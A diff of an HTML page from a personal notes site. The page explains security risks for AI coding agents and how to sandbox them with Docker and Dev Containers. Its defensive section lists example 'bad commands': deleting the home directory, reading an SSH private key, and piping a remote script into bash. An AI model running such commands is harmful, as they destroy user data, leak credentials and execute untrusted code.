@@ -5,10 +5,10 @@
     <meta name="viewport" content="width=device-width, initial-scale=1" />
     <title>Security Issues · Praneeth&#39;s CS Field Notes</title>
 
-    <meta name="description" content="Agents, feedback loops, and implementation habits." />
+    <meta name="description" content="Engineering habits for working with coding agents: design concepts, feedback loops, tests, and review." />
     <link rel="canonical" href="https://notes.praneeth-suresh-s.workers.dev/topics/agent-coding/security-issues/" />
     <meta property="og:title" content="Security Issues · Praneeth&#39;s CS Field Notes" />
-    <meta property="og:description" content="Agents, feedback loops, and implementation habits." />
+    <meta property="og:description" content="Engineering habits for working with coding agents: design concepts, feedback loops, tests, and review." />
     <meta property="og:type" content="website" />
     <meta property="og:url" content="https://notes.praneeth-suresh-s.workers.dev/topics/agent-coding/security-issues/" />
     <meta property="og:site_name" content="Praneeth&#39;s CS Field Notes" />
@@ -19,27 +19,25 @@
     <meta property="og:image:alt" content="Security Issues · Praneeth&#39;s CS Field Notes preview from Praneeth&#39;s CS Field Notes." />
     <meta name="twitter:card" content="summary_large_image" />
     <meta name="twitter:title" content="Security Issues · Praneeth&#39;s CS Field Notes" />
-    <meta name="twitter:description" content="Agents, feedback loops, and implementation habits." />
+    <meta name="twitter:description" content="Engineering habits for working with coding agents: design concepts, feedback loops, tests, and review." />
     <meta name="twitter:image" content="https://notes.praneeth-suresh-s.workers.dev/assets/social/theoretical-cs-preview.svg" />
     <meta name="twitter:image:alt" content="Security Issues · Praneeth&#39;s CS Field Notes preview from Praneeth&#39;s CS Field Notes." />
-    <script type="application/ld+json">{"@context":"https://schema.org","@type":"Person","@id":"https://notes.praneeth-suresh-s.workers.dev/#person","name":"Praneeth Suresh","url":"https://notes.praneeth-suresh-s.workers.dev/about/","sameAs":["https://github.com/Praneeth-Suresh","https://www.linkedin.com/in/praneeth-suresh-a114aa250/"],"jobTitle":"Software engineer and AI developer/researcher","knowsAbout":["AI research","Algorithms","Computer science","Software engineering","Agent reliability"]}</script>
+    <script type="application/ld+json">{"@context":"https://schema.org","@type":"Person","@id":"https://notes.praneeth-suresh-s.workers.dev/#person","name":"Praneeth Suresh","url":"https://notes.praneeth-suresh-s.workers.dev/about/","sameAs":["https://github.com/Praneeth-Suresh","https://www.linkedin.com/in/praneeth-suresh-a114aa250/"],"jobTitle":"ML engineer and computer science student","knowsAbout":["AI research","Algorithms","Computer science","Software engineering","Agent reliability"]}</script>
     <script type="application/ld+json">{"@context":"https://schema.org","@type":"Organization","@id":"https://notes.praneeth-suresh-s.workers.dev/#organization","name":"Praneeth's CS Field Notes","url":"https://notes.praneeth-suresh-s.workers.dev/","logo":"https://notes.praneeth-suresh-s.workers.dev/assets/social/theoretical-cs-preview.svg","founder":{"@id":"https://notes.praneeth-suresh-s.workers.dev/#person"},"sameAs":["https://github.com/Praneeth-Suresh","https://www.linkedin.com/in/praneeth-suresh-a114aa250/"]}</script>
     <script type="application/ld+json">{"@context":"https://schema.org","@type":"WebSite","@id":"https://notes.praneeth-suresh-s.workers.dev/#website","name":"Praneeth's CS Field Notes","url":"https://notes.praneeth-suresh-s.workers.dev/","inLanguage":"en","publisher":{"@id":"https://notes.praneeth-suresh-s.workers.dev/#organization"},"author":{"@id":"https://notes.praneeth-suresh-s.workers.dev/#person"},"potentialAction":{"@type":"SearchAction","target":{"@type":"EntryPoint","urlTemplate":"https://notes.praneeth-suresh-s.workers.dev/notes/?q={search_term_string}#topic-search"},"query-input":"required name=search_term_string"}}</script>
-    <script type="application/ld+json">{"@context":"https://schema.org","@type":"TechArticle","@id":"https://notes.praneeth-suresh-s.workers.dev/topics/agent-coding/security-issues/#webpage","url":"https://notes.praneeth-suresh-s.workers.dev/topics/agent-coding/security-issues/","name":"Security Issues · Praneeth's CS Field Notes","description":"Agents, feedback loops, and implementation habits.","inLanguage":"en","isPartOf":{"@id":"https://notes.praneeth-suresh-s.workers.dev/#website"},"primaryImageOfPage":{"@type":"ImageObject","url":"https://notes.praneeth-suresh-s.workers.dev/assets/social/theoretical-cs-preview.svg"}}</script>
-    <script type="application/ld+json">{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://notes.praneeth-suresh-s.workers.dev/"},{"@type":"ListItem","position":2,"name":"Agentic Coding","item":"https://notes.praneeth-suresh-s.workers.dev/topics/agent-coding/"},{"@type":"ListItem","position":3,"name":"Security Issues","item":"https://notes.praneeth-suresh-s.workers.dev/topics/agent-coding/security-issues/"}]}</script>
+    <script type="application/ld+json">{"@context":"https://schema.org","@type":"TechArticle","@id":"https://notes.praneeth-suresh-s.workers.dev/topics/agent-coding/security-issues/#webpage","url":"https://notes.praneeth-suresh-s.workers.dev/topics/agent-coding/security-issues/","name":"Security Issues · Praneeth's CS Field Notes","description":"Engineering habits for working with coding agents: design concepts, feedback loops, tests, and review.","inLanguage":"en","isPartOf":{"@id":"https://notes.praneeth-suresh-s.workers.dev/#website"},"primaryImageOfPage":{"@type":"ImageObject","url":"https://notes.praneeth-suresh-s.workers.dev/assets/social/theoretical-cs-preview.svg"}}</script>
+    <script type="application/ld+json">{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://notes.praneeth-suresh-s.workers.dev/"},{"@type":"ListItem","position":2,"name":"Notes","item":"https://notes.praneeth-suresh-s.workers.dev/notes/"},{"@type":"ListItem","position":3,"name":"Agentic Coding","item":"https://notes.praneeth-suresh-s.workers.dev/topics/agent-coding/"},{"@type":"ListItem","position":4,"name":"Security Issues","item":"https://notes.praneeth-suresh-s.workers.dev/topics/agent-coding/security-issues/"}]}</script>
     <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16'%3E%3Ctext y='14' font-size='14'%3ECS%3C/text%3E%3C/svg%3E" />
     <link rel="alternate" type="application/rss+xml" title="Praneeth&#39;s CS Field Notes RSS" href="/feed.xml" />
     <script>
       (() => {
         try {
           const savedTheme = window.localStorage.getItem("notes-theme");
-          const resolvedTheme = document.documentElement.dataset.homePage === "true"
-            ? "dark"
-            : savedTheme === "light" || savedTheme === "dark"
-              ? savedTheme
-              : window.matchMedia("(prefers-color-scheme: dark)").matches
-                ? "dark"
-                : "light";
+          const resolvedTheme = savedTheme === "light" || savedTheme === "dark"
+            ? savedTheme
+            : window.matchMedia("(prefers-color-scheme: dark)").matches
+              ? "dark"
+              : "light";
           document.documentElement.dataset.theme = resolvedTheme;
         } catch (error) {
           // Theme preference is optional when storage is unavailable.
@@ -47,75 +45,54 @@
       })();
     </script>
     <link rel="stylesheet" href="/assets/site.css" />
-    <script>
-      window.MathJax = {
-        loader: {
-          paths: { mathjax: "/assets/vendor/mathjax" }
-        },
-        tex: {
-          inlineMath: [["\\(", "\\)"]],
-          displayMath: [["\\[", "\\]"]]
-        },
-        svg: { fontCache: "global" }
-      };
-    </script>
-    <script defer src="/assets/vendor/mathjax/tex-svg-full.js"></script>
   </head>
-  <body data-analytics-event="page_view">
+  <body class="note-page" data-analytics-event="page_view">
     <a class="skip-link" href="#main-content">Skip to content</a>
-    <main class="layout">
+    <div class="layout">
       <header class="site-header">
-        <a class="brand-link" href="/" data-hotkey="H" aria-label="Praneeth&#39;s CS Field Notes home">Home</a>
-        <nav class="site-links" aria-label="Site navigation">
-          <a href="/start-here/" data-hotkey="S">Start</a>
-          <a href="/about/" data-hotkey="A">About</a>
-          <a href="/projects/" data-hotkey="P">Projects</a>
-          <a href="/notes/" data-hotkey="N">Notes</a>
-          <a href="/blog/" data-hotkey="B">Blog</a>
-          <a href="/contact/" data-hotkey="C">Contact</a>
-          <a href="/cv.pdf" data-analytics-event="cv_download_click">CV</a>
-          <a href="/feed.xml" data-hotkey="R" data-analytics-event="rss_click" data-subscribe-source="header">RSS</a>
-          <button class="theme-toggle" type="button" aria-pressed="false" aria-label="Switch color mode" title="Switch color mode"><svg class="theme-toggle-icon theme-icon-sun" viewBox="0 0 24 24" aria-hidden="true" focusable="false"><circle cx="12" cy="12" r="4"/><path d="M12 2v2M12 20v2M4.93 4.93l1.41 1.41M17.66 17.66l1.41 1.41M2 12h2M20 12h2M4.93 19.07l1.41-1.41M17.66 6.34l1.41-1.41"/></svg><svg class="theme-toggle-icon theme-icon-moon" viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path d="M20.7 15.5A8.5 8.5 0 0 1 8.5 3.3 8.5 8.5 0 1 0 20.7 15.5Z"/></svg></button>
-        </nav>
+      <a class="brand-link" href="/" data-hotkey="H" aria-label="Praneeth&#39;s CS Field Notes home">Praneeth&#39;s CS Field Notes</a>
+      <nav class="site-links" aria-label="Site navigation">
+        <a href="/notes/" data-hotkey="N" aria-current="page">Notes</a><a href="/projects/" data-hotkey="P">Projects</a><a href="/blog/" data-hotkey="W">Writing</a><a href="/about/" data-hotkey="A">About</a>
+        <a class="site-search-link" href="/notes/#topic-search" aria-label="Search the notes (press /)"><svg viewBox="0 0 24 24" aria-hidden="true" focusable="false"><circle cx="11" cy="11" r="6.5"/><path d="m16 16 4.5 4.5"/></svg><span>Search</span></a>
+        <button class="theme-toggle" type="button" aria-pressed="false" aria-label="Switch color mode" title="Switch color mode"><svg class="theme-toggle-icon theme-icon-sun" viewBox="0 0 24 24" aria-hidden="true" focusable="false"><circle cx="12" cy="12" r="4"/><path d="M12 2v2M12 20v2M4.93 4.93l1.41 1.41M17.66 17.66l1.41 1.41M2 12h2M20 12h2M4.93 19.07l1.41-1.41M17.66 6.34l1.41-1.41"/></svg><svg class="theme-toggle-icon theme-icon-moon" viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path d="M20.7 15.5A8.5 8.5 0 0 1 8.5 3.3 8.5 8.5 0 1 0 20.7 15.5Z"/></svg></button>
+      </nav>
+    </header>
+      <main id="main-content" tabindex="-1">
+      
+    <div class="note-layout">
+      <nav class="breadcrumb" aria-label="Breadcrumb"><ol><li><a href="/notes/">Notes</a></li><li><a href="/topics/agent-coding/">Agentic Coding</a></li><li aria-current="page">Security Issues</li></ol></nav>
+      <header class="note-header">
+        <h1 class="site-title">Security Issues</h1>
+        <p class="topic-parent">In <a href="/topics/agent-coding/">Agentic Coding</a></p>
+        
+        
       </header>
-      
-    <nav class="topic-nav" aria-label="Topic navigation"><a href="/" data-hotkey="H">Home</a><a class="" href="/topics/algorithms/" data-hotkey="1">Algorithms</a><a class="active" href="/topics/agent-coding/" data-hotkey="2">Agentic Coding</a><a class="" href="/topics/os/" data-hotkey="3">Operating Systems</a><a class="" href="/topics/ai-engineer/" data-hotkey="4">AI Engineering</a><a class="" href="/topics/swe/" data-hotkey="5">SWE for Pros</a><a class="" href="/topics/agent-build/" data-hotkey="6">Building Agents</a><a class="" href="/topics/c/" data-hotkey="7">C Deep Dive</a><a class="" href="/topics/cpp/" data-hotkey="8">C++ Deep Dive</a></nav>
-    <section id="main-content" class="panel notes-panel">
-      <h1 class="site-title">Security Issues</h1>
-      <p class="topic-parent">Subpage of Agentic Coding</p>
-      
-      <p class="topic-meta">Agents, feedback loops, and implementation habits.</p>
-      
-      
-    <section id="subscribe-topic-subpage-top" class="subscribe-panel subscribe-panel-compact" aria-labelledby="subscribe-title-topic-subpage-top">
-      <div>
-        <p class="section-kicker">/ Subscribe</p>
-        <h2 id="subscribe-title-topic-subpage-top">Follow the work.</h2>
-          <p>Get the monthly research and project update by email request or RSS.</p>
-      </div>
-      <div class="subscribe-actions" aria-label="Subscription actions">
-        <span class="primary-action" data-contact-source="topic-subpage-top">praneeth[dot]suresh[dot]s [at] gmail[dot]com</span>
-        <a class="secondary-action" href="/subscribe/" data-analytics-event="newsletter_cta_click" data-subscribe-source="topic-subpage-top">Subscription options</a>
-        <a class="secondary-action" href="/feed.xml" data-analytics-event="rss_click" data-subscribe-source="topic-subpage-top">Subscribe by RSS</a>
-      </div>
-    </section>
-  
-      <article class="note-article notion-page-content"><p class="notion-block notion-paragraph" data-notion-block-id="363d3a21-bb2d-800b-8d42-ed9f82c94785">The following are potential ways in which AI agents can be exploited:</p><ol class="notion-block notion-numbered-list note-list"><li class="notion-block notion-list-item note-list-item" data-notion-block-id="363d3a21-bb2d-805e-9e8a-dbd4b223bb2d">Slop Squatting: Models can hallucinate names, such as package names, leading to a possibility for malicious code to get injected.</li><li class="notion-block notion-list-item note-list-item" data-notion-block-id="363d3a21-bb2d-8047-9e80-df522f37de07">Prompt Injection: This involves hiding malicious instructions inside files/pages that AI would read.</li><li class="notion-block notion-list-item note-list-item" data-notion-block-id="363d3a21-bb2d-8072-bf98-e874116801ee">Confused Deputy: This is related to prompt injection as a technique where an attacker gains escalated privilege and performs unintended actions.</li></ol><p class="notion-block notion-paragraph" data-notion-block-id="363d3a21-bb2d-80f5-9551-f9fa634ffffe">For all of these reasons, it is important to ensure that the agent is sandboxed: it needs its own execution environment with everything it needs to work but nothing more.</p><h1 class="notion-block notion-heading notion-heading-1" data-notion-block-id="364d3a21-bb2d-80f3-a37f-e0a2336b678b">Fix 1: Sandboxes</h1><p class="notion-block notion-paragraph" data-notion-block-id="364d3a21-bb2d-806b-99fe-c6cdea9727ca">Local sandboxes are a <strong>damage-limiting layer</strong> for AI coding agents. They let the agent run commands, install packages, edit files, and test code inside a constrained environment instead of directly on your host OS.</p><p class="notion-block notion-paragraph" data-notion-block-id="364d3a21-bb2d-801a-99dc-d4e18cfb7faa">Docker containers isolate filesystem, networking, and process trees from the host by default, but bind mounts can still let container processes modify host files, so mount only the project directory and prefer read-only mounts where possible. (<a href="https://docs.docker.com/engine/containers/run/?utm_source=chatgpt.com" rel="noreferrer noopener">Docker Documentation</a>)</p><h2 class="notion-block notion-heading notion-heading-2" data-notion-block-id="364d3a21-bb2d-8070-8b32-f022f2da8ff8">Basic setup</h2><p class="notion-block notion-paragraph" data-notion-block-id="364d3a21-bb2d-80b9-abb9-c32da1ac8bdb">Create a project-specific container:</p><figure class="notion-block notion-code" data-notion-block-id="364d3a21-bb2d-80c4-bda8-c2c3de2eae54"><pre class="note-code-block" data-language="bash"><code class="language-bash">mkdir my-project
-cd my-project</code></pre></figure><p class="notion-block notion-paragraph" data-notion-block-id="364d3a21-bb2d-8021-9276-f8768487316a">Add a <code class="note-inline-code">Dockerfile</code>:</p><figure class="notion-block notion-code" data-notion-block-id="364d3a21-bb2d-804b-af40-f15a50c57efb"><pre class="note-code-block" data-language="plain-text"><code class="language-plain-text">FROM node:22-bookworm
+      <aside class="reading-margin" aria-label="About this note">
+      <aside class="note-provenance note-provenance-working" aria-label="Publication status">
+  <dl class="note-provenance-facts"><div><dt>Status</dt><dd><span class="note-status note-status-working">Working note</span></dd></div><div><dt>Type</dt><dd>Explainer</dd></div><div><dt>Reviewed</dt><dd>Not yet</dd></div></dl>
+  <p class="note-provenance-summary">Open notebook entry: incomplete or not yet checked. Known factual errors are still corrected.</p>
+  <div class="note-known-gaps"><p class="note-provenance-label">Known gaps</p><ul><li>Not yet addressed from the September 2026 site review. Tool/security list includes dated practices and code; attach threat model, versions, and sources.</li></ul></div>
+</aside>
+      <div class="margin-from"><p class="margin-label">From</p><a href="/topics/agent-coding/">Agentic Coding</a></div><div class="margin-next"><p class="margin-label">Next</p><a href="/topics/agent-coding/prompting-basics/">Prompting Basics</a><p>Next step in the Agentic Coding reading path (Put it together).</p></div>
+    </aside>
+      <div class="note-body">
+        
+        <article class="note-article notion-page-content"><p class="notion-block notion-paragraph" data-notion-block-id="363d3a21-bb2d-800b-8d42-ed9f82c94785">The following are potential ways in which AI agents can be exploited:</p><ol class="notion-block notion-numbered-list note-list"><li class="notion-block notion-list-item note-list-item" data-notion-block-id="363d3a21-bb2d-805e-9e8a-dbd4b223bb2d">Slop Squatting: Models can hallucinate names, such as package names, leading to a possibility for malicious code to get injected.</li><li class="notion-block notion-list-item note-list-item" data-notion-block-id="363d3a21-bb2d-8047-9e80-df522f37de07">Prompt Injection: This involves hiding malicious instructions inside files/pages that AI would read.</li><li class="notion-block notion-list-item note-list-item" data-notion-block-id="363d3a21-bb2d-8072-bf98-e874116801ee">Confused Deputy: This is related to prompt injection as a technique where an attacker gains escalated privilege and performs unintended actions.</li></ol><p class="notion-block notion-paragraph" data-notion-block-id="363d3a21-bb2d-80f5-9551-f9fa634ffffe">For all of these reasons, it is important to ensure that the agent is sandboxed: it needs its own execution environment with everything it needs to work but nothing more.</p><h2 class="notion-block notion-heading notion-heading-1" data-notion-block-id="364d3a21-bb2d-80f3-a37f-e0a2336b678b">Fix 1: Sandboxes</h2><p class="notion-block notion-paragraph" data-notion-block-id="364d3a21-bb2d-806b-99fe-c6cdea9727ca">Local sandboxes are a <strong>damage-limiting layer</strong> for AI coding agents. They let the agent run commands, install packages, edit files, and test code inside a constrained environment instead of directly on your host OS.</p><p class="notion-block notion-paragraph" data-notion-block-id="364d3a21-bb2d-801a-99dc-d4e18cfb7faa">Docker containers isolate filesystem, networking, and process trees from the host by default, but bind mounts can still let container processes modify host files, so mount only the project directory and prefer read-only mounts where possible. (<a href="https://docs.docker.com/engine/containers/run/?utm_source=chatgpt.com" rel="noreferrer noopener">Docker Documentation</a>)</p><h3 class="notion-block notion-heading notion-heading-2" data-notion-block-id="364d3a21-bb2d-8070-8b32-f022f2da8ff8">Basic setup</h3><p class="notion-block notion-paragraph" data-notion-block-id="364d3a21-bb2d-80b9-abb9-c32da1ac8bdb">Create a project-specific container:</p><figure class="notion-block notion-code" data-notion-block-id="364d3a21-bb2d-80c4-bda8-c2c3de2eae54"><pre class="note-code-block" data-language="bash" tabindex="0"><code class="language-bash">mkdir my-project
+cd my-project</code></pre></figure><p class="notion-block notion-paragraph" data-notion-block-id="364d3a21-bb2d-8021-9276-f8768487316a">Add a <code class="note-inline-code">Dockerfile</code>:</p><figure class="notion-block notion-code" data-notion-block-id="364d3a21-bb2d-804b-af40-f15a50c57efb"><pre class="note-code-block" data-language="plain-text" tabindex="0"><code class="language-plain-text">FROM node:22-bookworm
 
 RUN useradd -m coder
 USER coder
 
-WORKDIR /workspace</code></pre></figure><p class="notion-block notion-paragraph" data-notion-block-id="364d3a21-bb2d-80d3-a05d-cdff3a566865">Run the agent inside it:</p><figure class="notion-block notion-code" data-notion-block-id="364d3a21-bb2d-804b-9468-d9e33ca6e750"><pre class="note-code-block" data-language="bash"><code class="language-bash">docker build -t ai-coding-sandbox .
+WORKDIR /workspace</code></pre></figure><p class="notion-block notion-paragraph" data-notion-block-id="364d3a21-bb2d-80d3-a05d-cdff3a566865">Run the agent inside it:</p><figure class="notion-block notion-code" data-notion-block-id="364d3a21-bb2d-804b-9468-d9e33ca6e750"><pre class="note-code-block" data-language="bash" tabindex="0"><code class="language-bash">docker build -t ai-coding-sandbox .
 docker run --rm -it \
   --name ai-coding-sandbox \
   --mount type=bind,src=&quot;$PWD&quot;,dst=/workspace \
   --network none \
-  ai-coding-sandbox bash</code></pre></figure><ul class="notion-block notion-bulleted-list note-list"><li class="notion-block notion-list-item note-list-item" data-notion-block-id="364d3a21-bb2d-8003-b7f6-fe0f96b4a2ce"><code class="note-inline-code">-network none</code> removes external networking except loopback, which is useful when the agent does not need internet access. (<a href="https://docs.docker.com/engine/network/drivers/none/?utm_source=chatgpt.com" rel="noreferrer noopener">Docker Documentation</a>)</li></ul><h2 class="notion-block notion-heading notion-heading-2" data-notion-block-id="364d3a21-bb2d-803b-8297-df11336c3be4">Safer practical version</h2><p class="notion-block notion-paragraph" data-notion-block-id="364d3a21-bb2d-8040-9b00-ee1dae9fd661">Use this when the agent needs to read code but should not freely rewrite everything:</p><figure class="notion-block notion-code" data-notion-block-id="364d3a21-bb2d-8062-b7b0-ee6a4c0e1229"><pre class="note-code-block" data-language="bash"><code class="language-bash">docker run --rm -it \
+  ai-coding-sandbox bash</code></pre></figure><ul class="notion-block notion-bulleted-list note-list"><li class="notion-block notion-list-item note-list-item" data-notion-block-id="364d3a21-bb2d-8003-b7f6-fe0f96b4a2ce"><code class="note-inline-code">-network none</code> removes external networking except loopback, which is useful when the agent does not need internet access. (<a href="https://docs.docker.com/engine/network/drivers/none/?utm_source=chatgpt.com" rel="noreferrer noopener">Docker Documentation</a>)</li></ul><h3 class="notion-block notion-heading notion-heading-2" data-notion-block-id="364d3a21-bb2d-803b-8297-df11336c3be4">Safer practical version</h3><p class="notion-block notion-paragraph" data-notion-block-id="364d3a21-bb2d-8040-9b00-ee1dae9fd661">Use this when the agent needs to read code but should not freely rewrite everything:</p><figure class="notion-block notion-code" data-notion-block-id="364d3a21-bb2d-8062-b7b0-ee6a4c0e1229"><pre class="note-code-block" data-language="bash" tabindex="0"><code class="language-bash">docker run --rm -it \
   --mount type=bind,src=&quot;$PWD&quot;,dst=/workspace,readonly \
   --mount type=volume,src=agent-tmp,dst=/tmp/agent \
   --network none \
-  ai-coding-sandbox bash</code></pre></figure><p class="notion-block notion-paragraph" data-notion-block-id="364d3a21-bb2d-8094-a387-cfa3d7f5bf3c">Then copy only approved changes back to the host.</p><h2 class="notion-block notion-heading notion-heading-2" data-notion-block-id="364d3a21-bb2d-8030-8a10-efe96348d743">Dev Container setup</h2><p class="notion-block notion-paragraph" data-notion-block-id="364d3a21-bb2d-80fb-b871-e7986cf09f47">For VS Code/Cursor-style workflows, create <code class="note-inline-code">.devcontainer/devcontainer.json</code>:</p><figure class="notion-block notion-code" data-notion-block-id="364d3a21-bb2d-8039-b543-eab7169df1b7"><pre class="note-code-block" data-language="json"><code class="language-json">{
+  ai-coding-sandbox bash</code></pre></figure><p class="notion-block notion-paragraph" data-notion-block-id="364d3a21-bb2d-8094-a387-cfa3d7f5bf3c">Then copy only approved changes back to the host.</p><h3 class="notion-block notion-heading notion-heading-2" data-notion-block-id="364d3a21-bb2d-8030-8a10-efe96348d743">Dev Container setup</h3><p class="notion-block notion-paragraph" data-notion-block-id="364d3a21-bb2d-80fb-b871-e7986cf09f47">For VS Code/Cursor-style workflows, create <code class="note-inline-code">.devcontainer/devcontainer.json</code>:</p><figure class="notion-block notion-code" data-notion-block-id="364d3a21-bb2d-8039-b543-eab7169df1b7"><pre class="note-code-block" data-language="json" tabindex="0"><code class="language-json">{
   &quot;name&quot;: &quot;AI Coding Sandbox&quot;,
   &quot;build&quot;: {
     &quot;dockerfile&quot;: &quot;Dockerfile&quot;
@@ -128,75 +105,40 @@ docker run --rm -it \
   &quot;mounts&quot;: [
     &quot;source=${localWorkspaceFolder},target=/workspace,type=bind&quot;
   ]
-}</code></pre></figure><p class="notion-block notion-paragraph" data-notion-block-id="364d3a21-bb2d-80bc-b5f5-fea4a4c6ea72">Dev Containers are meant to provide a full development environment around a codebase, with source code mounted into the container. (<a href="https://devcontainers.github.io/implementors/spec/?utm_source=chatgpt.com" rel="noreferrer noopener">Dev Containers</a>)</p><h2 class="notion-block notion-heading notion-heading-2" data-notion-block-id="364d3a21-bb2d-809b-a708-eb28a65ad744">Rules for using local sandboxes with AI agents</h2><p class="notion-block notion-paragraph" data-notion-block-id="364d3a21-bb2d-80e0-a6a8-c3c313c2cca4">Give the agent access only to the project folder, not your home directory, SSH keys, browser profile, cloud credentials, or <code class="note-inline-code">.env</code> files.</p><p class="notion-block notion-paragraph" data-notion-block-id="364d3a21-bb2d-802b-a20f-d07d7491fbb8">Use a non-root container user. Avoid <code class="note-inline-code">--privileged</code>, host networking, Docker socket mounts, and Docker-in-Docker unless absolutely necessary.</p><p class="notion-block notion-paragraph" data-notion-block-id="364d3a21-bb2d-8008-968e-cf9c4953e579">Keep secrets outside the sandbox. When secrets are required, pass short-lived, least-privilege tokens.</p><p class="notion-block notion-paragraph" data-notion-block-id="364d3a21-bb2d-8029-a7be-daa0b1f79cfb">Disable network by default. Enable it only for dependency installation or API calls, then turn it off again.</p><p class="notion-block notion-paragraph" data-notion-block-id="364d3a21-bb2d-80a6-8ab0-cc9489ab339e">Review diffs before applying changes:</p><figure class="notion-block notion-code" data-notion-block-id="364d3a21-bb2d-8012-841b-e888de16a81d"><pre class="note-code-block" data-language="bash"><code class="language-bash">git diff
-git status</code></pre></figure><p class="notion-block notion-paragraph" data-notion-block-id="364d3a21-bb2d-8065-b04f-c8d0e3d24468">Run tests inside the sandbox:</p><figure class="notion-block notion-code" data-notion-block-id="364d3a21-bb2d-8039-bbe5-e49dd958d851"><pre class="note-code-block" data-language="bash"><code class="language-bash">npm test
+}</code></pre></figure><p class="notion-block notion-paragraph" data-notion-block-id="364d3a21-bb2d-80bc-b5f5-fea4a4c6ea72">Dev Containers are meant to provide a full development environment around a codebase, with source code mounted into the container. (<a href="https://devcontainers.github.io/implementors/spec/?utm_source=chatgpt.com" rel="noreferrer noopener">Dev Containers</a>)</p><h3 class="notion-block notion-heading notion-heading-2" data-notion-block-id="364d3a21-bb2d-809b-a708-eb28a65ad744">Rules for using local sandboxes with AI agents</h3><p class="notion-block notion-paragraph" data-notion-block-id="364d3a21-bb2d-80e0-a6a8-c3c313c2cca4">Give the agent access only to the project folder, not your home directory, SSH keys, browser profile, cloud credentials, or <code class="note-inline-code">.env</code> files.</p><p class="notion-block notion-paragraph" data-notion-block-id="364d3a21-bb2d-802b-a20f-d07d7491fbb8">Use a non-root container user. Avoid <code class="note-inline-code">--privileged</code>, host networking, Docker socket mounts, and Docker-in-Docker unless absolutely necessary.</p><p class="notion-block notion-paragraph" data-notion-block-id="364d3a21-bb2d-8008-968e-cf9c4953e579">Keep secrets outside the sandbox. When secrets are required, pass short-lived, least-privilege tokens.</p><p class="notion-block notion-paragraph" data-notion-block-id="364d3a21-bb2d-8029-a7be-daa0b1f79cfb">Disable network by default. Enable it only for dependency installation or API calls, then turn it off again.</p><p class="notion-block notion-paragraph" data-notion-block-id="364d3a21-bb2d-80a6-8ab0-cc9489ab339e">Review diffs before applying changes:</p><figure class="notion-block notion-code" data-notion-block-id="364d3a21-bb2d-8012-841b-e888de16a81d"><pre class="note-code-block" data-language="bash" tabindex="0"><code class="language-bash">git diff
+git status</code></pre></figure><p class="notion-block notion-paragraph" data-notion-block-id="364d3a21-bb2d-8065-b04f-c8d0e3d24468">Run tests inside the sandbox:</p><figure class="notion-block notion-code" data-notion-block-id="364d3a21-bb2d-8039-bbe5-e49dd958d851"><pre class="note-code-block" data-language="bash" tabindex="0"><code class="language-bash">npm test
 pytest
-go test ./...</code></pre></figure><p class="notion-block notion-paragraph" data-notion-block-id="364d3a21-bb2d-80a7-bd83-cae0198ed979">Commit only after inspection.</p><h2 class="notion-block notion-heading notion-heading-2" data-notion-block-id="364d3a21-bb2d-80fa-a3fa-c169937baa01">What this protects against</h2><p class="notion-block notion-paragraph" data-notion-block-id="364d3a21-bb2d-80bb-9d9c-cdfe34073243">A sandbox helps contain bad commands like:</p><figure class="notion-block notion-code" data-notion-block-id="364d3a21-bb2d-801f-a241-c7f6c9f40fed"><pre class="note-code-block" data-language="bash"><code class="language-bash">rm -rf ~
+go test ./...</code></pre></figure><p class="notion-block notion-paragraph" data-notion-block-id="364d3a21-bb2d-80a7-bd83-cae0198ed979">Commit only after inspection.</p><h3 class="notion-block notion-heading notion-heading-2" data-notion-block-id="364d3a21-bb2d-80fa-a3fa-c169937baa01">What this protects against</h3><p class="notion-block notion-paragraph" data-notion-block-id="364d3a21-bb2d-80bb-9d9c-cdfe34073243">A sandbox helps contain bad commands like:</p><figure class="notion-block notion-code" data-notion-block-id="364d3a21-bb2d-801f-a241-c7f6c9f40fed"><pre class="note-code-block" data-language="bash" tabindex="0"><code class="language-bash">rm -rf ~
 cat ~/.ssh/id_rsa
 curl malicious-script | bash</code></pre></figure><p class="notion-block notion-paragraph" data-notion-block-id="364d3a21-bb2d-8004-a662-d7763c1e0452">But it is not perfect. If you mount sensitive host directories, expose Docker’s socket, run privileged containers, or give the agent real credentials, the sandbox can be bypassed in practice.</p></article>
-      <nav class="next-reading" aria-label="Next reading">
-  <p class="section-kicker">/ Next</p>
+        
+        <nav class="next-reading" aria-label="Next reading">
   <a class="next-reading-link" href="/topics/agent-coding/prompting-basics/">
-    <span>Next reading</span>
+    <span class="next-reading-label">Next</span>
     <strong>Prompting Basics</strong>
-    <p>Continue inside Agentic Coding</p>
+    <span class="note-publication"><span class="note-status note-status-working">Working note</span><span class="note-type">Explainer</span></span>
   </a>
+  <p>Next step in the Agentic Coding reading path (Put it together).</p>
 </nav>
-      
-    <section class="reading-trail" aria-labelledby="reading-trail-title-topic-subpage">
-      <div>
-        <p class="section-kicker">/ Continue</p>
-        <h2 id="reading-trail-title-topic-subpage">Follow the technical trail.</h2>
-        <p>Use the dense notes as the source material, then move through the guided route, writing, or project proof when you want a cleaner entry point.</p>
       </div>
-      <div class="reading-trail-actions" aria-label="Reader next steps">
-        <a class="secondary-action" href="/start-here/">Start Here</a>
-        <a class="secondary-action" href="/blog/">Writing</a>
-        <a class="secondary-action" href="/projects/">Projects</a>
-        <a class="secondary-action" href="/subscribe/">Subscribe</a>
-      </div>
-    </section>
+    </div>
   
-      
-    <section id="subscribe-topic-subpage" class="subscribe-panel" aria-labelledby="subscribe-title-topic-subpage">
-      <div>
-        <p class="section-kicker">/ Subscribe</p>
-        <h2 id="subscribe-title-topic-subpage">Subscribe for monthly AI research/project updates.</h2>
-          <p>One rigorous AI research or project update every 3-4 weeks, with paper trails, mechanisms, experiments, and implementation tradeoffs in one place.</p>
-      </div>
-      <div class="subscribe-actions" aria-label="Subscription actions">
-        <span class="primary-action" data-contact-source="topic-subpage">praneeth[dot]suresh[dot]s [at] gmail[dot]com</span>
-        <a class="secondary-action" href="/subscribe/" data-analytics-event="newsletter_cta_click" data-subscribe-source="topic-subpage">Subscription options</a>
-        <a class="secondary-action" href="/feed.xml" data-analytics-event="rss_click" data-subscribe-source="topic-subpage">Subscribe by RSS</a>
-      </div>
-    </section>
-  
-    </section>
-  
+      </main>
       
